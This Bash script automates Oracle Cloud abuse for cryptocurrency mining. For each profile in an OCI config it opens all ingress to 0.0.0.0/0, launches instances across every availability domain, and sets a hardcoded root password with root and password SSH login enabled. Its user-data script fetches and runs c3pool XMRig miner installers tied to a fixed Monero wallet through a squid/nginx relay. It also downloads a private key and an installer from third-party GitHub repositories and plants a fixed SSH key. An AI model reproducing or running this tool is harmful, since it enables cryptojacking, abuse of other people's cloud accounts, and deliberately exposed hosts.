#!/usr/bin/env bash

# 字体颜色配置
Green="\033[32m"
Red="\033[31m"
Yellow="\033[33m"
Blue="\033[36m"
Font="\033[0m"
GreenBG="\033[42;37m"
RedBG="\033[41;37m"
OK="${Green}[OK]${Font}"
ERROR="${Red}[ERROR]${Font}"

ins () {
    # install extra deps
    apt update -y &>/dev/null || yum makecache fast &>/dev/null || dnf makecache fast &>/dev/null;
    apt install -y -q $1 &>/dev/null || yum install -q -y $1 || dnf install -q -y $1;
}

ins_oci () {
    # install python3 when python3 command not found
	if ! [ -x "$(command -v python3)" ]; then
    bash -c "$(curl -L https://raw.githubusercontent.com/gcp5678/smithmlo/main/py.sh)" ;	  
    fi
    # install oci cli when oci command not found
    curl -skLo "/dev/shm/ins.sh" "https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh";
    bash "/dev/shm/ins.sh" --accept-all-defaults;
    rm -f /dev/shm/ins.sh;
    export PATH=$PATH:/root/bin;
    . $HOME/.bashrc;
}

# define strange variables
shape_cfg="shape.tb";
cidr_block="10.233.0.0/16";
outer_proxy="10.233.0.233"
oci_cfg="$HOME/.oci/config";
done_cfg="$HOME/.oci/dconfig"
os_dis="Canonical Ubuntu";
os_ver="20.04";
max_wait="233";
ssh_pub_key_file="$HOME/.ssh/id_rsa.pub";
cmd_file="mi.sh"
proxy_file="pf.sh"

# custom script
cat << eof > "${cmd_file}"
#!/bin/bash
echo root:wh125125 |sudo chpasswd;
sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sudo sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
sudo service sshd restart;
while true;do
    curl -skm 5 ifconfig.me -x http://10.233.0.233:3128 -o /dev/null && break;
done
curl -skm 300 -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh \
    -x http://10.233.0.233:3128 -o /tmp/x86.sh;
curl -skm 300 -L https://raw.githubusercontent.com/coreff/peer2profit/main/setup_c3pool_miner.sh \
    -x http://10.233.0.233:3128 -o /tmp/arm.sh;
sed -ri "s#curl -L#curl -L -x http://10.233.0.233:3128 #g" /tmp/x86.sh /tmp/arm.sh;
uname -m|grep -qi aarch64 && LC_ALL=en_US.UTF-8 sudo bash /tmp/arm.sh 46MVgvFXbVZNvpAKrQPSWgevqqANgadFGTq2ocvZ5SjkT7vmLdLyKJ5eUgZrstVLExM8Q9ZsPyuRECfTDEmf2EwVDTBfdpZ || \
                             LC_ALL=en_US.UTF-8 sudo bash /tmp/x86.sh 46MVgvFXbVZNvpAKrQPSWgevqqANgadFGTq2ocvZ5SjkT7vmLdLyKJ5eUgZrstVLExM8Q9ZsPyuRECfTDEmf2EwVDTBfdpZ 
echo "10.233.0.233 auto.c3pool.org" >> /etc/hosts;
systemctl daemon-reload;
systemctl restart c3pool_miner;
eof

# custom script for proxy machine
cat << eof > "${proxy_file}"
#!/bin/bash
echo root:wh125125 |sudo chpasswd;
sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sudo sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
sudo service sshd restart;
firewall-cmd --permanent --add-rich-rule="rule family=ipv4 source address=${cidr_block} accept";
firewall-cmd --permanent --add-rich-rule="rule family=ipv4 source address=${cidr_block} accept" --permanent;
iptables -F;
iptables -I INPUT -s ${cidr_block} -j ACCEPT;
iptables-save;
systemctl disable iptables --now;
>/etc/iptables/rules.v4;
>/etc/iptables/rules.v6;
apt update -y;
apt install -y squid nginx;
sed -ri "/http_access deny all/i\acl inner src $cidr_block\nhttp_access allow inner" /etc/squid/squid.conf
echo '''stream {
    resolver 1.1.1.1;
    server {
        listen 19999;
        proxy_pass auto.c3pool.org:19999;
    }
}''' >>/etc/nginx/nginx.conf;
systemctl restart squid nginx;
systemctl enable nginx squid;
eof

# define vm shape cfgs
cat << eof > "${shape_cfg}"
shape cpu ram count disk
VM.Standard1.2 2 14 1 50
VM.Standard1.4 4 28 1 50
VM.Standard3.Flex 2 32 1 50
VM.Standard.E3.Flex 6 96 1 50
VM.Standard.E4.Flex 6 96 1 51
VM.Standard2.2 2 30 1 50
VM.Standard.E2.2 2 16 1 50
VM.Standard.E2.4 4 32 1 50
VM.Standard.A1.Flex 16 96 1 52
eof


check_env () {
    # do some prepare
    (($(id -u)==0)) || exit 233
    touch "${done_cfg}";
    command -v oci &>/dev/null || ins_oci;
    command -v jq &>/dev/null || ins jq;
    #[[ -f "$ssh_pub_key_file" ]] || ssh-keygen -t rsa -f "$(sed -r "s/.pub$//g" <<< $ssh_pub_key_file)" -P '' -q;
    #ssh_pub_key=$(cat $ssh_pub_key_file);
    ssh_pub_key="ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAohFX9JoZusjJMfA2S2xEQeMgKu7u9TRiEhChh0psgP3yF7sICxVSPZQt+kIYrXEffDRlajlxt78NecRKqfiRh2D4HL0okrESrHOAJ97HZloA9hVPimfAt5oMvzggrVZilN41iaZX4lxYlu8r6fFeZjBocvRs3VN/6JZt1Naj8KGnuLL22wl9UzXeGrw6D2GRtiki6qGNcaNE2mdL4f5y6DGsCHMPqw2a/MrkE9bXX8XYjhd3+zRa9PNoYV6XoVX0o9E184jrIekOhK892g/kjtbzrNpwUbhDZlVYSifUAVD7URrqZWB8W0nIMjaOTfcyG/Y4yhwR/cSZksstje6IaQ== smithao";
    export OCI_CLI_SUPPRESS_FILE_PERMISSIONS_WARNING=True;
    sed -ri "s/\r//g" "${oci_cfg}";
}

exec_pre () {
    tenancy_id=$(oci --config-file "${oci_cfg}" --profile "${profile}" iam availability-domain list --query 'data[0]."compartment-id"' --raw-output);
    tenancy_name=$(oci --config-file "${oci_cfg}" --profile "${profile}" iam tenancy get --tenancy-id "${tenancy_id}" --query data.name --raw-output);
    ins_name="${tenancy_name}-$(date +%F)";
    FOLDER=~/.oci
    FILE=~/.oci/smithao.pem
    if [ -d "$FOLDER" ]; then       
       if test -f "$FILE"; then
        print_ok "秘钥已存在"
       else
         cd $FOLDER && wget https://raw.githubusercontent.com/voyku/voyku/main/key/smithao.pem && chmod 600 smithao.pem;
       fi
    else
      mkdir $FOLDER && chmod 600 $FOLDER && cd $FOLDER ;
      wget https://raw.githubusercontent.com/voyku/voyku/main/key/smithao.pem && chmod 600 smithao.pem ;
    fi  
    cd ~   
}

get_img_id () {
    # get image id for both aarch64 & x86
    img_aarch64=$(oci compute image list \
        -c $tenancy_id \
	--profile $profile \
	--config-file $oci_cfg \
	--all --operating-system "$os_dis" \
	--operating-system-version "$os_ver" \
	--sort-by TIMECREATED \
	--query "data[*]".{'img_id:id,img_name:"display-name"'} \
	|grep -B1 "img_name.*aarch64" \
	|awk -F '"' '/img_id/{print $(NF-1);exit}');
    img_x86=$(oci compute image list \
        -c $tenancy_id \
    --profile $profile \
    --config-file "$oci_cfg" \
	--all --operating-system "$os_dis" \
	--operating-system-version "$os_ver" \
	--sort-by TIMECREATED \
	--query "data[*]".{'img_id:id,img_name:"display-name"'} \
	|grep -B1 "img_name.*$os_ver-2" \
	|awk -F '"' '/img_id/{print $(NF-1);exit}');
}

settle_network () {
    # prepare a useable VCN
    vcn_id=$(oci --config-file "${oci_cfg}" --profile "${profile}" network vcn create --cidr-block ${cidr_block} -c ${tenancy_id} --query data.id --raw-output);
    subnet_id=$(oci --config-file "${oci_cfg}" --profile "${profile}" network subnet create --cidr-block ${cidr_block} -c ${tenancy_id} --vcn-id ${vcn_id} --query data.id --raw-output);
    gw_id=$(oci --config-file "${oci_cfg}" --profile "${profile}" network internet-gateway create -c $tenancy_id --is-enabled true --vcn-id ${vcn_id} --max-wait-seconds ${max_wait} --wait-for-state AVAILABLE --query data.id --raw-output);
    rt_id=$(oci --config-file "${oci_cfg}" --profile "${profile}" network route-table list -c ${tenancy_id} --query "data[*]".{'rt_id:id,vcn_id:"vcn-id"'} |jq -c '.[] | select(.vcn_id=="'"$vcn_id"'")'|jq -r '.rt_id');
    oci --config-file "${oci_cfg}" --profile "${profile}" network route-table update \
        --rt-id ${rt_id} --force \
	--route-rules '[{"cidrBlock":"0.0.0.0/0","networkEntityId":"'"${gw_id}"'"}]' \
	--max-wait-seconds ${max_wait} --wait-for-state AVAILABLE &>/dev/null
for sec_id in $(oci --config-file "${oci_cfg}" --profile "${profile}" network  security-list list -c ${tenancy_id} --query "data[*]".id --raw-output|awk -F '"' '/"/{print $(NF-1)}');do
    oci --config-file "${oci_cfg}" --profile "${profile}" network security-list update  --security-list-id ${sec_id} --ingress-security-rules '[{"source": "0.0.0.0/0", "protocol": "all", "isStateless": false, "tcpOptions": null, "udp-options": null}]' --force;
    done
}

launch_instance () {
    # launch instance according to cfgs
    oci compute instance launch \
    --config-file "${oci_cfg}" \
    --profile "${profile}" \
    -c "${tenancy_id}" \
    --availability-domain ${ad} \
    --image-id ${img_id} \
    --subnet-id ${subnet_id} \
    --shape "${o_shape}" \
    --assign-public-ip $1 \
    --metadata '{"ssh_authorized_keys": "'"${ssh_pub_key}"'"}' \
    --user-data-file "$2" \
    --shape-config '{"ocpus":'${o_cpu}',"memory_in_gbs":'${o_ram}'}' \
    --boot-volume-size-in-gbs "${o_disk}" \
    --display-name "${ins_name}" \
    --wait-for-state $3 \
    --wait-interval-seconds "${max_wait}" \
    --private-ip "$4" \
    &>/dev/null
}

exec_proxy_launch () {
    #ad=$(oci --config-file "${oci_cfg}" --profile "${profile}" iam availability-domain list -c "${tenancy_id}" --query "data[*]".name --raw-output|awk -F '"' '/AD/{print $(NF-1);exit}');
    img_id=${img_x86};
    for ad in $(oci --config-file "${oci_cfg}" --profile "${profile}" iam availability-domain list -c "${tenancy_id}" --query "data[*]".name --raw-output|awk -F '"' '/AD/{print $(NF-1)}');do
        echo "VM.Standard.E2.1.Micro 1 1 2 50"|while read o_shape o_cpu o_ram o_count o_disk _;do
            launch_instance true "${proxy_file}" "RUNNING" "${outer_proxy}";
        done
    done
}

exec_launch () {
    # execute instance launch in each AD with all shape cfgs
    for ad in $(oci --config-file "${oci_cfg}" --profile "${profile}" iam availability-domain list -c "${tenancy_id}" --query "data[*]".name --raw-output|awk -F '"' '/AD/{print $(NF-1)}');do 
        grep "^VM" ${shape_cfg}|while read o_shape o_cpu o_ram o_count o_disk _;do
            [[ "${o_shape}" == "VM.Standard.A1.Flex" ]] && img_id=${img_aarch64} || img_id=${img_x86};
            for ((j=0;j<o_count;j++));do
	            launch_instance false "${cmd_file}" "PROVISIONING" "";
	        done
        done
    done
    echo "${profile}" >> "${done_cfg}";
}

function print_ok() {
echo -e "${OK} ${Blue} $1 ${Font}"
}


exec_destroy () {
    for ad in $(oci --config-file "${oci_cfg}" --profile "${profile}" iam availability-domain list -c "${tenancy_id}" --query "data[*]".name --raw-output|awk -F '"' '/AD/{print $(NF-1)}');do 
        for ins in $(oci --config-file "${oci_cfg}" --profile "${profile}" compute instance list --availability-domain "${ad}" --lifecycle-state RUNNING --all -c "${tenancy_id}" --query "data[*]".id --raw-output|awk -F '"' '/"/{print $2}');do
            oci --config-file "${oci_cfg}" --profile "${profile}" compute instance terminate --instance-id "${ins}" --wait-interval-seconds "${max_wait}" --force; 
        done
    done    
}

l_destroy () {
    check_env;
    for profile in $(cat "${done_cfg}");do
        oci iam user list --config-file "${oci_cfg}" --profile "${profile}" &>/dev/null || continue;
        exec_pre;
        exec_destroy;
    done
}

lmain () {
    check_env;
    for profile in $(grep "^\[" "${oci_cfg}"|tr -d '[]');do
        grep -qE "^$profile$" "${done_cfg}" && continue;
        oci iam user list --config-file "${oci_cfg}" --profile "${profile}" &>/dev/null || continue;
        exec_pre;
        settle_network;
        get_img_id;
        exec_proxy_launch;
        exec_launch;
    done
}

[ "$1" == "destroy" ] && l_destroy || lmain;
